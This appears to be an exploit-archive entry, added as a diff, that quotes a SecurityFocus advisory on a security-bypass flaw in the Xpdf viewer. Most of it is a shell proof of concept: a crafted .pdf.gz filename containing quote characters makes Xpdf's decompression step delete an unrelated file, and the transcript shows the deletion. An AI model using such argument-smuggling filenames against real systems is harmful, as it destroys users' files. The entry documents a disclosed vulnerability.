@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/49007/info
+
+Xpdf is prone to a security-bypass vulnerability that may allow attackers to perform actions without proper authorization.
+
+Attackers can exploit this issue to bypass security restrictions and perform unauthorized actions; this may aid in launching further attacks. 
+
+$ touch y # The unrelated victim file
+$ gzip -c </dev/null >'" y ".pdf.gz' # Create a .pdf.gz file
+$ xpdf '" y ".pdf.gz' # View it using xpdf
+Error: May not be a PDF file (continuing anyway)
+Error: PDF file is damaged - attempting to reconstruct xref table...
+Error: Couldn't find trailer dictionary
+Error: Couldn't read xref table
+rm: cannot remove `/tmp/': Is a directory
+$ ls -l y # The victim file is gone!
+ls: cannot access y: No such file or directory 
